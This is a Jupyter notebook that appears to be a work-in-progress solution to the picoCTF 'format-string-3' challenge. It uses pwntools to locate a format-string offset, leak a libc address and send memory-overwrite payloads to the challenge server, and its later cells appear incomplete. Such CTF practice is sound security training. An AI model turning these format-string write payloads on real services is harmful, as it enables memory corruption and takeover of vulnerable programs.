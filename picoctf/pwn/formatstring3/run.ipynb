{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pwn import ELF, context, remote, FmtStr, fmtstr_payload\n",
    "\n",
    "context.log_level = \"critical\"\n",
    "context.binary = ELF('./format-string-3')\n",
    "def exec_fmt(payload):\n",
    "    r = remote('rhea.picoctf.net', 54235)\n",
    "    r.recvuntil(b\"Okay I'll be nice. Here's the address of setvbuf in libc: \")\n",
    "    r.recvline()\n",
    "    r.sendline(payload)\n",
    "    ret = r.recvall()\n",
    "    return ret\n",
    "\n",
    "autofmt = FmtStr(exec_fmt)\n",
    "offset = autofmt.offset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'               c               \\x8b                               \\xb0aaaabaaH@@Howdy gamers!\\n'"
      ]
     },
     "execution_count": 41,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\n",
    "exec_fmt(fmtstr_payload(offset, {0x00404048: 0x402010}))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'                                                                                                                                '"
      ]
     },
     "execution_count": 50,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from pwnlib.util.packing import unpack\n",
    "r = remote('rhea.picoctf.net', 54235)\n",
    "r.recvuntil(b\"Okay I'll be nice. Here's the address of setvbuf in libc: \")\n",
    "setvbuf_addr = unpack(bytes.fromhex(r.recvline().decode()[2:-1]), 'all')\n",
    "payload = fmtstr_payload(offset, {0x004012f2: 0xfffffdb8e8})\n",
    "r.sendline(payload)\n",
    "r.recvall()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'0xf0333fe1b570'"
      ]
     },
     "execution_count": 44,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "hex(264102905754992)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
